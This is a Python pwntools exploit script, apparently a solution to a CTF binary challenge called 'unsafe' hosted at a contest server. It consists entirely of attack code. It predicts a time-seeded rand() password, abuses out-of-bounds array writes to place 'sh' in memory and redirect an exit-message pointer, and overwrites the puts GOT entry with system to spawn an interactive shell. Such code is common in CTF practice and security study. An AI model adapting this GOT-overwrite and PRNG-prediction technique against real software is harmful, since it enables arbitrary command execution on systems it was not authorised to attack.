#!/usr/bin/env python3

# type: ignore
# flake8: noqa

import ctypes

from pwn import *

elf = context.binary = ELF("./unsafe", checksec=False)
libc = ELF("./libc.so.6", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc ctf.tcp1p.com 1477"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

libc_dll = ctypes.CDLL(libc.path)
io.sendline(b"17")
io.sendline(b"aaa")
time = libc_dll.time(0)
seed = time * (0x610a * 0x6161 + 17)
libc_dll.srand(seed)
password = libc_dll.rand()
log.info(f"{password=:#x}")
io.sendline(str(password).encode())

libc_system = libc.sym["system"]
log.info(f"{libc_system=:#x}")
libc_puts = libc.sym["puts"]
log.info(f"{libc_puts=:#x}")
delta = libc_system - libc_puts

safes = elf.sym["safes"]
exit_msg = elf.sym["exit_message"]
log.info(f"setup 'sh' on safes[1]")
io.sendline(b"1")
io.sendline(str(u32(b"sh\x00\x00")).encode())
log.info(f"overwriting exit_msg to point to safes[1]")
io.sendline(str((exit_msg - safes) // 8).encode())
io.sendline(str(0x2060).encode())
log.info(f"overwriting puts GOT with system")
io.sendline(str((elf.got["puts"] - safes) // 8).encode())
io.sendline(str(delta).encode())

io.interactive()
